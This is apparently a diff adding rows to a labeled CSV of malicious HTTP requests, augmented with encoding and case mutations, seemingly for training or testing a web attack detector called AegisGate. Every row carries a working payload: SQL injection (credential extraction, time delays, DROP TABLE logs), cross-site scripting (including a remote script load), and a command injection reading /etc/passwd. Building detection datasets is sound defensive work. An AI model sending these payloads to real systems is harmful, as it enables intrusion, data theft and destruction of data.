+POST,/api/v1/admin/ping,,"{""Content-Type"": ""application/x-www-form-urlencoded""}",ip%253D127.0.0.1%25253B%252520cat%252520%252Fetc%252Fpasswd,1,Command Injection,mutation_aug,c29eeec046d8
+POST,/api/v1/login,q%253D%252527%252520OR%252520%252527a%252527%25253D%252527a,"{""User-Agent"": ""Mozilla/5.0""}",user=%27%20OR%20%27a%27%3D%27a&pass=123,1,SQLi,mutation_aug,c8f73b37dfe9
+POST,/api/v1/search,,"{""User-Agent"": ""Mozilla/5.0""}",user%3D1%20OR%201%3D1%26pass%3D123,1,SQLi,mutation_aug,c6d55b3f8a9a
+GET,/api/v1/comments,,"{""User-Agent"": ""Mozilla/5.0""}","{%22comment"":%20""javascript:alert(1)%22}",1,XSS,mutation_aug,98e6e29feb58
+GET,/api/v1/login,q%253D%252527%252520OR%252520sleep%2525285%252529%252523,"{""User-Agent"": ""Mozilla/5.0""}",,1,SQLi,mutation_aug,0b808af5248f
+POST,/api/v1/login,q=%27%20UNION%20SELECT%20NULL%2C%20NULL%2C%20NULL%2D%2D,"{""User-Agent"": ""Mozilla/5.0""}",,1,SQLi,mutation_aug,837ea9e6da50
+GET,/api/v1/comments,input%253D%25253Ca%252520href%25253D%252522javascript%25253Aalert%252528%252527AegisGate%252527%252529%252522%25253Eclick%25253C%252Fa%25253E,"{""User-Agent"": ""Mozilla/5.0""}",,1,XSS,mutation_aug,99ab131c2b23
+GET,/search,input%253D%25253Ciframe%252520src%25253D%252522javascript%25253Aalert%2525281%252529%252522%25253E,"{""User-Agent"": ""Mozilla/5.0""}","{""comment"": ""<iframe src=\""javascript:alert(1)\"">""}",1,XSS,mutation_aug,777629b8d5ed
+POST,/api/v1/login,q%253D%252527%252520OR%252520sleep%2525285%252529%252523,"{""User-Agent"": ""Mozilla/5.0""}",,1,SQLi,mutation_aug,b8ccf5b86c8c
+GET,/api/v1/login,q%3D%27%20UNION%20SELECT%20NULL%2C%20NULL%2C%20NULL-%2D,"{""User-Agent"": ""Mozilla/5.0""}",user=%27%20UNION%20SELECT%20NULL%2C%20NULL%2C%20NULL--&pass=123,1,SQLi,mutation_aug,42146f419ae4
+GET,/api/v1/login,q=%27%20UN/**/ION%20SEL/**/ECT%20NULL%2C%20NULL%2C%20NULL--,"{""User-Agent"": ""Mozilla/5.0""}",user=%27%20UNION%20SELECT%20NULL%2C%20NULL%2C%20NULL--&pass=123,1,SQLi,mutation_aug,42146f419ae4
+GET,/api/v1/search,q%253D1%252520OR%2525201%25253D1,"{""User-Agent"": ""Mozilla/5.0""}",,1,SQLi,mutation_aug,7e4e91b00846
+POST,/api/v1/comments,input%253D%25253Cimg%252520src%25253Dx%252520onerror%25253Dalert%252528%252527XSS%252527%252529%25253E,"{""User-Agent"": ""Mozilla/5.0""}","{""comment"": ""<img src=x onerror=alert('XSS')>""}",1,XSS,mutation_aug,98c69563f64e
+POST,/api/v1/search,q%253D%252527%252520OR%2525201%25253D1--,"{""User-Agent"": ""Mozilla/5.0""}",,1,SQLi,mutation_aug,c859a0191b22
+POST,/api/v1/search,Q=%27%20oR%201%3D1--,"{""User-Agent"": ""Mozilla/5.0""}",,1,SQLi,mutation_aug,c859a0191b22
+GET,/api/v1/comments,INpuT=jaVasCRIPT%3aALerT%281%29,"{""User-Agent"": ""Mozilla/5.0""}",,1,XSS,mutation_aug,35dc6ebb8e83
+GET,/api/v1/login,q%253D%252527%252520OR%252520%252527a%252527%25253D%252527a,"{""User-Agent"": ""Mozilla/5.0""}",,1,SQLi,mutation_aug,4538d9ae5b4b
+GET,/api/v1/login,Q=%27%20Or%20%27a%27%3D%27A,"{""User-Agent"": ""Mozilla/5.0""}",,1,SQLi,mutation_aug,4538d9ae5b4b
+POST,/api/v1/login,q%3D%27%3B%20WAITFOR%20DELAY%20%270%3A0%3A5%27%2D%2D,"{""User-Agent"": ""Mozilla/5.0""}",,1,SQLi,mutation_aug,780ab9d754c8
+POST,/api/v1/search,q%3D%27%3B%20WAITFOR%20DELAY%20%270%3A0%3A5%27%2D%2D,"{""User-Agent"": ""Mozilla/5.0""}",,1,SQLi,mutation_aug,0f2a7f7a49d7
+POST,/api/v1/search,q%253D%252527%252520UNION%252520SELECT%252520username%25252C%252520password%252520FROM%252520users--,"{""User-Agent"": ""Mozilla/5.0""}",,1,SQLi,mutation_aug,9e6c60c62d04
+POST,/api/v1/search,Q=%27%20UniON%20SEleCT%20USeRNAmE%2C%20pASsword%20FroM%20uSeRS--,"{""User-Agent"": ""Mozilla/5.0""}",,1,SQLi,mutation_aug,9e6c60c62d04
+POST,/search,,"{""User-Agent"": ""Mozilla/5.0""}","{""cOMMeNt"": ""<INPuT OnFocuS=alerT(1) AUtOFoCus>""}",1,XSS,mutation_aug,acff3b88957e
+GET,/api/v1/search,q%3Dadmin%27%20%2D%2D,"{""User-Agent"": ""Mozilla/5.0""}",,1,SQLi,mutation_aug,1c9a6e461255
+GET,/api/v1/search,q%253D%252527%25253B%252520WAITFOR%252520DELAY%252520%2525270%25253A0%25253A5%252527--,"{""User-Agent"": ""Mozilla/5.0""}",,1,SQLi,mutation_aug,dfbd563d242e
+POST,/search,,"{""User-Agent"": ""Mozilla/5.0""}","{""COMMEnT"": ""<svG onLoAd=alERT(1)>""}",1,XSS,mutation_aug,c48a50efbe4d
+POST,/search,,"{""User-Agent"": ""Mozilla/5.0""}",%257B%2522comment%2522%253A%2520%2522%253Csvg%2520onload%253Dalert%25281%2529%253E%2522%257D,1,XSS,mutation_aug,c48a50efbe4d
+POST,/api/v1/search,q%253D1%252527%252520AND%252520%252528SELECT%2525201%252520FROM%252520%252528SELECT%252520COUNT%252528%25252A%252529%25252C%252520CONCAT%252528%252528SELECT%252520version%252528%252529%252529%25252C%252520FLOOR%252528RAND%2525280%252529%25252A2%252529%252529%252520x%252520FROM%252520information_schema.tables%252520GROUP%252520BY%252520x%252529%252520a%252529--,"{""User-Agent"": ""Mozilla/5.0""}",user=1%27%20AND%20%28SELECT%201%20FROM%20%28SELECT%20COUNT%28%2A%29%2C%20CONCAT%28%28SELECT%20version%28%29%29%2C%20FLOOR%28RAND%280%29%2A2%29%29%20x%20FROM%20information_schema.tables%20GROUP%20BY%20x%29%20a%29--&pass=123,1,SQLi,mutation_aug,edb4303db921
+POST,/api/v1/search,q%3D1%27%20AND%20%28SELECT%201%20FROM%20%28SELECT%20COUNT%28%2A%29%2C%20CONCAT%28%28SELECT%20version%28%29%29%2C%20FLOOR%28RAND%280%29%2A2%29%29%20x%20FROM%20information_schema.tables%20GROUP%20BY%20x%29%20a%29-%2D,"{""User-Agent"": ""Mozilla/5.0""}",user=1%27%20AND%20%28SELECT%201%20FROM%20%28SELECT%20COUNT%28%2A%29%2C%20CONCAT%28%28SELECT%20version%28%29%29%2C%20FLOOR%28RAND%280%29%2A2%29%29%20x%20FROM%20information_schema.tables%20GROUP%20BY%20x%29%20a%29--&pass=123,1,SQLi,mutation_aug,edb4303db921
+POST,/search,input%253D%25253Ca%252520href%25253D%252522javascript%25253Aalert%252528%252527AegisGate%252527%252529%252522%25253Eclick%25253C%252Fa%25253E,"{""User-Agent"": ""Mozilla/5.0""}",,1,XSS,mutation_aug,3bb310f6843b
+POST,/api/v1/comments,input%253D%25253Cscript%25253Ealert%2525281%252529%25253C%252Fscript%25253E,"{""User-Agent"": ""Mozilla/5.0""}",,1,XSS,mutation_aug,544bf5bc5a72
+GET,/api/v1/search,,"{""User-Agent"": ""Mozilla/5.0""}",uSer=1%27%20AND%20%28SELEct%201%20FrOM%20%28sELeCT%20cOUNt%28%2A%29%2c%20coNcat%28%28sELEcT%20verSiON%28%29%29%2C%20FlOOR%28raND%280%29%2A2%29%29%20x%20fROM%20infORMatiOn_sChEmA.TaBLes%20GRouP%20BY%20X%29%20a%29--&PASS=123,1,SQLi,mutation_aug,8ef6d0cda21e
+GET,/api/v1/search,,"{""User-Agent"": ""Mozilla/5.0""}",user=1%27%20AND%20%28SELECT%201%20FROM%20%28SELECT%20COUNT%28%2A%29%2C%20CONCAT%28%28SELECT%20version%28%29%29%2C%20FLOOR%28RAND%280%29%2A2%29%29%20x%20FROM%20information_schema.tables%20GROUP%20BY%20x%29%20a%29%2D%2D&pass=123,1,SQLi,mutation_aug,8ef6d0cda21e
+GET,/api/v1/search,q%253D1%252527%252520AND%252520%252528SELECT%2525201%252520FROM%252520%252528SELECT%252520COUNT%252528%25252A%252529%25252C%252520CONCAT%252528%252528SELECT%252520version%252528%252529%252529%25252C%252520FLOOR%252528RAND%2525280%252529%25252A2%252529%252529%252520x%252520FROM%252520information_schema.tables%252520GROUP%252520BY%252520x%252529%252520a%252529--,"{""User-Agent"": ""Mozilla/5.0""}",user=1%27%20AND%20%28SELECT%201%20FROM%20%28SELECT%20COUNT%28%2A%29%2C%20CONCAT%28%28SELECT%20version%28%29%29%2C%20FLOOR%28RAND%280%29%2A2%29%29%20x%20FROM%20information_schema.tables%20GROUP%20BY%20x%29%20a%29--&pass=123,1,SQLi,mutation_aug,8f64b638999d
+GET,/api/v1/search,q%3D1%27%20AND%20%28SELECT%201%20FROM%20%28SELECT%20COUNT%28%2A%29%2C%20CONCAT%28%28SELECT%20version%28%29%29%2C%20FLOOR%28RAND%280%29%2A2%29%29%20x%20FROM%20information_schema.tables%20GROUP%20BY%20x%29%20a%29%2D%2D,"{""User-Agent"": ""Mozilla/5.0""}",user=1%27%20AND%20%28SELECT%201%20FROM%20%28SELECT%20COUNT%28%2A%29%2C%20CONCAT%28%28SELECT%20version%28%29%29%2C%20FLOOR%28RAND%280%29%2A2%29%29%20x%20FROM%20information_schema.tables%20GROUP%20BY%20x%29%20a%29--&pass=123,1,SQLi,mutation_aug,8f64b638999d
+POST,/search,inpUT=%3CSCRipt%3EAlERT%281%29%3c/sCRipt%3E,"{""User-Agent"": ""Mozilla/5.0""}","{""comment"": ""<script>alert(1)</script>""}",1,XSS,mutation_aug,21c5d9440e2a
+POST,/search,input%253D%25253Cscript%25253Ealert%2525281%252529%25253C%252Fscript%25253E,"{""User-Agent"": ""Mozilla/5.0""}","{""comment"": ""<script>alert(1)</script>""}",1,XSS,mutation_aug,21c5d9440e2a
+GET,/api/v1/login,,"{""User-Agent"": ""Mozilla/5.0""}",user%3D1%27%20ORDER%20BY%2010-%2D%26pass=123,1,SQLi,mutation_aug,72293760eba0
+GET,/api/v1/comments,InpuT=%3cA%20Href%3d%22javaScript%3aalERT%28%27AEgiSGate%27%29%22%3ecLicK%3C/a%3E,"{""User-Agent"": ""Mozilla/5.0""}","{""comment"": ""<a href=\""javascript:alert('AegisGate')\"">click</a>""}",1,XSS,mutation_aug,f7dbf2bf37e2
+GET,/api/v1/search,q=%27%20Or%20SleeP%285%29%23,"{""User-Agent"": ""Mozilla/5.0""}",user=%27%20OR%20sleep%285%29%23&pass=123,1,SQLi,mutation_aug,56a5195b54df
+GET,/api/v1/login,Q=1%3B%20DrOp%20tAbLE%20LogS--,"{""User-Agent"": ""Mozilla/5.0""}",,1,SQLi,mutation_aug,d02d3ef1c62d
+GET,/api/v1/login,q%3D1%3B%20DROP%20TABLE%20logs-%2D,"{""User-Agent"": ""Mozilla/5.0""}",,1,SQLi,mutation_aug,d02d3ef1c62d
+POST,/api/v1/search,,"{""User-Agent"": ""Mozilla/5.0""}",user%253D1%252527%252520ORDER%252520BY%25252010--%2526pass%253D123,1,SQLi,mutation_aug,907ad42fce89
+POST,/api/v1/comments,iNPut=%27%22%3e%3cscriPt%20SRc%3dhtTP%3A//TesT.Local/Xss.JS%3e%3c/scRipt%3E,"{""User-Agent"": ""Mozilla/5.0""}","{""comment"": ""'\""><script src=http://test.local/xss.js></script>""}",1,XSS,mutation_aug,45ee5017fed1
+GET,/search,,"{""User-Agent"": ""Mozilla/5.0""}","{""comment"":	""<input  onfocus=alert(1) 	 autofocus>""}",1,XSS,mutation_aug,99347abaabae
+GET,/search,,"{""User-Agent"": ""Mozilla/5.0""}","{""ComMent"": ""<iNpuT ONFoCus=aleRT(1) AUtofOCUs>""}",1,XSS,mutation_aug,99347abaabae
+POST,/api/v1/search,q=1%27%20AND%20%28SELECT%201%20FROm%20%28SEleCt%20COUnT%28%2a%29%2c%20COnCAt%28%28SeLEcT%20vERsIOn%28%29%29%2c%20FLoor%28Rand%280%29%2a2%29%29%20X%20FroM%20iNFORMATION_sChEMa.tAbLEs%20grOUP%20by%20X%29%20a%29--,"{""User-Agent"": ""Mozilla/5.0""}",,1,SQLi,mutation_aug,dd1e41ba90ed
+GET,/search,INPUt=%3CscriPT%3ealERt%281%29%3C/ScriPt%3E,"{""User-Agent"": ""Mozilla/5.0""}","{""comment"": ""<script>alert(1)</script>""}",1,XSS,mutation_aug,44485d22f0e0
+GET,/api/v1/login,,"{""User-Agent"": ""Mozilla/5.0""}",user%253D1%252520OR%2525201%25253D1%2526pass%253D123,1,SQLi,mutation_aug,3a16915cf89c
+POST,/search,input%253D%25253Ciframe%252520src%25253D%252522javascript%25253Aalert%2525281%252529%252522%25253E,"{""User-Agent"": ""Mozilla/5.0""}",,1,XSS,mutation_aug,b857280a756c
+POST,/search,input%3D%3Ca%20href%3D%22javascript%3Aalert%28%27AegisGate%27%29%22%3Eclick%3C%2Fa%3E,"{""User-Agent"": ""Mozilla/5.0""}","{""comment"": ""<a href=\""javascript:alert('AegisGate')\"">click</a>""}",1,XSS,mutation_aug,676648eaac32
+POST,/search,input%253D%25253Ca%252520href%25253D%252522javascript%25253Aalert%252528%252527AegisGate%252527%252529%252522%25253Eclick%25253C%252Fa%25253E,"{""User-Agent"": ""Mozilla/5.0""}","{""comment"": ""<a href=\""javascript:alert('AegisGate')\"">click</a>""}",1,XSS,mutation_aug,676648eaac32
+GET,/search,,"{""User-Agent"": ""Mozilla/5.0""}","{""comment"": 	 ""<script>alert(document.domain)</script>""}",1,XSS,mutation_aug,18bb97fb8d60
+GET,/search,,"{""User-Agent"": ""Mozilla/5.0""}","{%22comment"":%20%22%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E%22}",1,XSS,mutation_aug,18bb97fb8d60
+GET,/api/v1/search,q%253D1%252520OR%2525201%25253D1,"{""User-Agent"": ""Mozilla/5.0""}",user=1%20OR%201%3D1&pass=123,1,SQLi,mutation_aug,30c2fa659b80
+POST,/api/v1/login,q%3Dadmin%27%20%2D%2D,"{""User-Agent"": ""Mozilla/5.0""}",,1,SQLi,mutation_aug,12c664c16bb9
+POST,/api/v1/login,q%253Dadmin%252527%252520--,"{""User-Agent"": ""Mozilla/5.0""}",,1,SQLi,mutation_aug,12c664c16bb9
+GET,/api/v1/search,q%3Dadmin%27%20%2D%2D,"{""User-Agent"": ""Mozilla/5.0""}",user=admin%27%20--&pass=123,1,SQLi,mutation_aug,248ed0f86e5c
+POST,/search,,"{""User-Agent"": ""Mozilla/5.0""}","{""Comment"": ""<imG Src=x onERROR=alert('xSs')>""}",1,XSS,mutation_aug,ca0dce29fa58
+POST,/search,,"{""User-Agent"": ""Mozilla/5.0""}","{""comment"":/**/""<img 	 src=x  onerror=alert('XSS')>""}",1,XSS,mutation_aug,ca0dce29fa58
+GET,/api/v1/comments,,"{""User-Agent"": ""Mozilla/5.0""}","{""comment"":	""<img  src=x/**/onerror=alert('XSS')>""}",1,XSS,mutation_aug,296169543356
+GET,/api/v1/comments,,"{""User-Agent"": ""Mozilla/5.0""}","{%22comment%22:%20""<img src%3Dx onerror%3Dalert%28%27XSS%27%29%3E%22}",1,XSS,mutation_aug,296169543356
+GET,/search,input%3D%3Csvg%20onload%3Dalert%281%29%3E,"{""User-Agent"": ""Mozilla/5.0""}",,1,XSS,mutation_aug,e3fc860fe298
+POST,/api/v1/login,,"{""User-Agent"": ""Mozilla/5.0""}",user%253D%252527%252520OR%252520sleep%2525285%252529%252523%2526pass%253D123,1,SQLi,mutation_aug,3934ca098af5
+POST,/api/v1/login,,"{""User-Agent"": ""Mozilla/5.0""}",user=%27%20OR%20sleep%285%29%23%26pass=123,1,SQLi,mutation_aug,3934ca098af5
+POST,/search,,"{""User-Agent"": ""Mozilla/5.0""}","{""comment"":  ""javascript:alert(1)""}",1,XSS,mutation_aug,0caf8fe7988c
+POST,/search,,"{""User-Agent"": ""Mozilla/5.0""}","{&quot;comment&#x22;: ""javascript:alert(1)""}",1,XSS,mutation_aug,0caf8fe7988c
+POST,/api/v1/comments,input=%3Ca%20href%3D%22javascript%3Aalert%28%27AegisGate%27%29%22%3Eclick%3C%2Fa%3E,"{""User-Agent"": ""Mozilla/5.0""}",,1,XSS,mutation_aug,4266e54ac3a0
+GET,/api/v1/comments,input%253D%252527%252522%25253E%25253Cscript%252520src%25253Dhttp%25253A%252F%252Ftest.local%252Fxss.js%25253E%25253C%252Fscript%25253E,"{""User-Agent"": ""Mozilla/5.0""}","{""comment"": ""'\""><script src=http://test.local/xss.js></script>""}",1,XSS,mutation_aug,ebec00a624ee
+GET,/api/v1/comments,INPut=%27%22%3E%3cscRIpt%20SrC%3DHttP%3a//TESt.loCAl/xSS.jS%3E%3c/scRiPt%3E,"{""User-Agent"": ""Mozilla/5.0""}","{""comment"": ""'\""><script src=http://test.local/xss.js></script>""}",1,XSS,mutation_aug,ebec00a624ee
+POST,/api/v1/login,,"{""User-Agent"": ""Mozilla/5.0""}",USer=1%20Or%201%3D1&PASs=123,1,SQLi,mutation_aug,316ba07cf6f3
+POST,/api/v1/login,,"{""User-Agent"": ""Mozilla/5.0""}",user%253Dadmin%252527%252520--%2526pass%253D123,1,SQLi,mutation_aug,654e226e9361
+GET,/api/v1/search,,"{""User-Agent"": ""Mozilla/5.0""}",user=%27%20uNion%20SELect%20usernaME%2c%20PasSWOrd%20FRoM%20uSerS--&PAsS=123,1,SQLi,mutation_aug,d5dbf5d7c5f6
+POST,/search,input%3D%3Ciframe%20src%3D%22javascript%3Aalert%281%29%22%3E,"{""User-Agent"": ""Mozilla/5.0""}","{""comment"": ""<iframe src=\""javascript:alert(1)\"">""}",1,XSS,mutation_aug,b4f591866047
+POST,/api/v1/search,,"{""User-Agent"": ""Mozilla/5.0""}",user%253D1%252527%252520AND%252520%252528SELECT%2525201%252520FROM%252520%252528SELECT%252520COUNT%252528%25252A%252529%25252C%252520CONCAT%252528%252528SELECT%252520version%252528%252529%252529%25252C%252520FLOOR%252528RAND%2525280%252529%25252A2%252529%252529%252520x%252520FROM%252520information_schema.tables%252520GROUP%252520BY%252520x%252529%252520a%252529--%2526pass%253D123,1,SQLi,mutation_aug,a5c5435c37e8
+POST,/api/v1/comments,input%3D%3Csvg%20onload%3Dalert%281%29%3E,"{""User-Agent"": ""Mozilla/5.0""}","{""comment"": ""<svg onload=alert(1)>""}",1,XSS,mutation_aug,76c53118f854
+POST,/api/v1/comments,,"{""User-Agent"": ""Mozilla/5.0""}","{""COMMenT"": ""<a hREF=\""JavaSCRipt:AlErt('AEgiSGatE')\"">clICK</a>""}",1,XSS,mutation_aug,135165ad7efd
+GET,/api/v1/search,q=1%3B%20DROP%20TABLE%20logs%2D%2D,"{""User-Agent"": ""Mozilla/5.0""}",user=1%3B%20DROP%20TABLE%20logs--&pass=123,1,SQLi,mutation_aug,1dc42068a19c
+GET,/search,,"{""User-Agent"": ""Mozilla/5.0""}","{&#34;comment&#34;: ""javascript:alert(1)""}",1,XSS,mutation_aug,b1ac5fd10698
+GET,/search,,"{""User-Agent"": ""Mozilla/5.0""}","{""comment"":/**/""javascript:alert(1)""}",1,XSS,mutation_aug,b1ac5fd10698
+GET,/api/v1/comments,,"{""User-Agent"": ""Mozilla/5.0""}","{""CommEnT"": ""'\""><SCRipt srC=htTP://teST.LocaL/xsS.jS></scRIPt>""}",1,XSS,mutation_aug,bdac1f88a5f7
+POST,/api/v1/search,q%253D%252527%25253B%252520WAITFOR%252520DELAY%252520%2525270%25253A0%25253A5%252527--,"{""User-Agent"": ""Mozilla/5.0""}",user=%27%3B%20WAITFOR%20DELAY%20%270%3A0%3A5%27--&pass=123,1,SQLi,mutation_aug,58787ad79cda
+POST,/api/v1/comments,,"{""User-Agent"": ""Mozilla/5.0""}","{""comment"": 	 ""<svg
+onload=alert(1)>""}",1,XSS,mutation_aug,ab870791b997
+POST,/api/v1/comments,,"{""User-Agent"": ""Mozilla/5.0""}","{""COmMenT"": ""<SVG oNLOAD=AlErT(1)>""}",1,XSS,mutation_aug,ab870791b997
+GET,/api/v1/login,,"{""User-Agent"": ""Mozilla/5.0""}",user=1%3B%20DR/**/OP%20TABLE%20logs--&pass=123,1,SQLi,mutation_aug,31002aa5ff60
+GET,/api/v1/login,,"{""User-Agent"": ""Mozilla/5.0""}",USeR=1%3B%20drOP%20TaBle%20lOgs--&paSs=123,1,SQLi,mutation_aug,31002aa5ff60
+GET,/api/v1/comments,iNPuT=%3cIFRaME%20SRc%3D%22jaVAscriPT%3aAlert%281%29%22%3E,"{""User-Agent"": ""Mozilla/5.0""}",,1,XSS,mutation_aug,29c63350da05
+GET,/api/v1/login,Q=%27%20OR%201%3D1--,"{""User-Agent"": ""Mozilla/5.0""}",user=%27%20OR%201%3D1--&pass=123,1,SQLi,mutation_aug,72213b482800
+GET,/api/v1/login,q=%27%20OR%201%3D1%2D%2D,"{""User-Agent"": ""Mozilla/5.0""}",user=%27%20OR%201%3D1--&pass=123,1,SQLi,mutation_aug,72213b482800
+GET,/api/v1/login,q=1%27%20aND%20%28sELECt%201%20fROm%20%28SelecT%20cOUnT%28%2A%29%2c%20concAt%28%28sElect%20VErsiOn%28%29%29%2C%20fLoOr%28rANd%280%29%2A2%29%29%20X%20From%20iNforMATion_SChema.Tables%20gRoup%20bY%20X%29%20A%29--,"{""User-Agent"": ""Mozilla/5.0""}",,1,SQLi,mutation_aug,29f19fbac702
+GET,/api/v1/login,q%3D1%27%20AND%20%28SELECT%201%20FROM%20%28SELECT%20COUNT%28%2A%29%2C%20CONCAT%28%28SELECT%20version%28%29%29%2C%20FLOOR%28RAND%280%29%2A2%29%29%20x%20FROM%20information_schema.tables%20GROUP%20BY%20x%29%20a%29-%2D,"{""User-Agent"": ""Mozilla/5.0""}",,1,SQLi,mutation_aug,29f19fbac702
+GET,/api/v1/search,,"{""User-Agent"": ""Mozilla/5.0""}",uSEr=1%27%20ordeR%20BY%2010--&PaSS=123,1,SQLi,mutation_aug,10d26c9a02ba
+GET,/search,,"{""User-Agent"": ""Mozilla/5.0""}",%257B%2522comment%2522%253A%2520%2522%253Cimg%2520src%253Dx%2520onerror%253Dalert%2528%2527XSS%2527%2529%253E%2522%257D,1,XSS,mutation_aug,c52ec545c20e
+GET,/search,,"{""User-Agent"": ""Mozilla/5.0""}","{""comment"":
+""<img/**/src=x 	 onerror=alert('XSS')>""}",1,XSS,mutation_aug,c52ec545c20e
+GET,/api/v1/comments,input%253D%25253Cbody%252520onload%25253Dalert%252528%252527XSS%252527%252529%25253E,"{""User-Agent"": ""Mozilla/5.0""}","{""comment"": ""<body onload=alert('XSS')>""}",1,XSS,mutation_aug,d38dab58ff8e
